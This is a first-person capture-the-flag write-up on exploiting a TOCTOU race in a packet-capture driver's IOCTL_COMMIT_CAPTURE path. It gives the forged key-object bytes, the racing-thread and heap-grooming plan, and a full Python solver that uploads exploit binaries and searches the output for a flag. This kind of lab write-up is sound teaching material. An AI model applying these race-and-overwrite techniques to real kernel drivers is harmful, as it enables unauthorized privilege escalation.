WinCapture - Racing the Kernel

PktTrack ships a kernel-mode packet capture driver. Their internal audit flagged a race condition in the capture commit path, and management decided the window was "too small to exploit in practice." I decided to prove them wrong.

This is my writeup of how I exploited the TOCTOU race condition in IOCTL_COMMIT_CAPTURE to corrupt an adjacent key object in kernel memory, grab elevated access, and pull the flag. I did it in about three hours. Here is exactly how I did it.

01 //

triage - the capture interface

phase / recon

I was handed WinCapture.sys - a kernel-mode driver for packet capture. My goal was to exploit it and get code running on their remote Windows x64 machine. The server takes an executable as Base64, starts a driver instance, and runs whatever I send it. I liked those terms.

First thing I noticed: the driver exposes itself through a named pipe:

\\.\pipe\WinCapture

I spent time reversing the frontend protocol. It uses binary IOCTL framing. After pulling it apart, I identified the primary request structure:

// Request structure struct request { uint32_t ioctl; uint32_t input_length; uint32_t output_length; uint8_t input[input_length]; };

And the response I had to handle:

// Response structure struct response { uint32_t ntstatus; uint32_t information; uint8_t output[information]; };

Once I had the framing down, I could talk directly to the driver. That's when I started hunting the race condition their audit mentioned but didn't bother fixing.

02 //

the race condition

phase / analysis

The description tipped me off - race condition in the capture commit path. I pulled up IOCTL_COMMIT_CAPTURE in my disassembler and found it almost immediately: a textbook TOCTOU flaw nobody bothered to close.

The commit path validates the capture length first. If it passes, the driver uses that same length variable to copy data. The problem is that I can modify that length from another thread in the gap between the check and the copy. So I did.

I let Thread A validate the length as 16 bytes - passes the check, looks clean.
I had Thread B slam the shared length variable to 24 bytes in that gap.
Thread A then copies 24 bytes, not 16. The driver has no idea.
I now have 8 bytes of controlled out-of-bounds write. Exactly what I needed.

A 16-byte capture buffer sits right next to an 8-byte key object in memory. I win the race, I write 24 bytes, and those extra 8 bytes land directly on the key object. I tried this approach and it worked first time I got the timing right.

03 //

forging the key object

phase / exploitation

To get the flag I had to pass an authorization check. I reversed it and found it reads from the adjacent key object:

// Target key structure struct key_object { uint32_t magic; // 0x4b455901 uint32_t authorized; // 1 };

I needed my 8-byte overflow to forge that exact structure. In little-endian hex, the bytes I had to spill were:

01 59 45 4b 01 00 00 00

My final payload: 16 bytes of benign capture data followed by those 8 bytes. When I win the race, the driver validates 16 bytes, I flip it to 24, and it writes my forged key structure over the real one. Authorization granted - by me, for me.

04 //

execution sequence

phase / exploitation

I built the exploit around two threads hammering the vulnerability until I won the race. Here is what I did, step by step:

  • I connected to \\.\pipe\WinCapture.
  • I allocated the capture object and the key object, deliberately grooming the heap so they land adjacent.
  • I prepared the 24-byte payload with my forged key bytes at the end.
  • I spun up Thread 1 to constantly toggle the shared capture length between 16 and 24.
  • I spun up Thread 2 to spam IOCTL_COMMIT_CAPTURE requests as fast as possible.

It is probabilistic - sometimes I lost the race and got "not authorized", sometimes the stage alloc failed. I wrapped the whole thing in a retry loop and let it run. It landed the flag. I will take that every time.

solver script - Python

phase / code

Here is the full solver I wrote. This is what I ran to land the flag.

#!/usr/bin/env python3
from __future__ import annotations
import argparse, base64, pathlib, re, socket, ssl, sys, time

PROMPT = b"Waiting for exploit.exe"

def recv_until(sock, needle: bytes, timeout: float) -> bytes:
    sock.settimeout(timeout)
    out = bytearray()
    while needle not in out:
        chunk = sock.recv(65536)
        if not chunk:
            raise RuntimeError("server closed before upload prompt")
        out += chunk
    return bytes(out)

def run_once(host: str, port: int, blob: bytes, tls: bool, timeout: float) -> bytes:
    raw = socket.create_connection((host, port), timeout=15)
    sock = ssl._create_unverified_context().wrap_socket(raw, server_hostname=host) if tls else raw
    with sock:
        banner = recv_until(sock, PROMPT, 25)
        sys.stdout.buffer.write(banner)
        sys.stdout.buffer.flush()
        enc = base64.b64encode(blob)
        for i in range(0, len(enc), 76):
            sock.sendall(enc[i:i+76] + b"\n")
        sock.sendall(b"END\n")
        sock.settimeout(timeout)
        out = bytearray()
        while True:
            try:
                part = sock.recv(65536)
            except socket.timeout:
                break
            if not part:
                break
            out += part
            sys.stdout.buffer.write(part)
            sys.stdout.buffer.flush()
        return bytes(out)

def find_flag(data: bytes):
    for pat in (rb'(?:[A-Za-z0-9_]+)?CTF\{[^}\r\n]+\}', rb'(?:omni|OMNI)\{[^}\r\n]+\}', rb'[A-Za-z0-9_]+\{[^}\r\n]{4,}\}'):
        m = re.search(pat, data)
        if m:
            return m.group().decode(errors="replace")
    return None

def main() -> int:
    ap = argparse.ArgumentParser(description="Probe WinCapture pipe framing, then race the driver")
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("--ssl", action="store_true")
    ap.add_argument("--timeout", type=float, default=90.0)
    ap.add_argument("--attempts", type=int, default=30, help="race retries after a framing mode reaches initialization")
    args = ap.parse_args()
    here = pathlib.Path(__file__).resolve().parent
    modes = [2, 1, 4, 3, 5, 6, 7, 8, 9]
    for mode in modes:
        path = here / f"exploit_m{mode}.exe"
        if not path.exists():
            continue
        blob = path.read_bytes()
        max_tries = args.attempts
        for attempt in range(1, max_tries + 1):
            print(f"\n[*] header-mode={mode} attempt {attempt}/{max_tries} ({len(blob)} bytes)", flush=True)
            try:
                out = run_once(args.host, args.port, blob, args.ssl, args.timeout)
            except Exception as exc:
                print(f"[-] transport error: {exc}", flush=True)
                time.sleep(0.5)
                continue
            flag = find_flag(out)
            if flag:
                print(f"\n[+] FLAG: {flag}")
                return 0
            low = out.lower()
            fatal_markers = (
                b"stage_alloc status=", b"no reply to stage_alloc",
                b"key_alloc status=", b"no reply to key_alloc",
                b"initial capture_load failed",
            )
            if any(x in low for x in fatal_markers):
                print(f"[-] mode {mode} rejected during initialization; trying next layout", flush=True)
                break
            if b"racing commit" in low:
                print("[-] framing and initialization succeeded; retrying the race", flush=True)
                time.sleep(0.25)
                continue
            print("[-] no decisive marker; trying this mode again", flush=True)
            time.sleep(0.5)
    print("[-] all framing modes exhausted without a flag", flush=True)
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
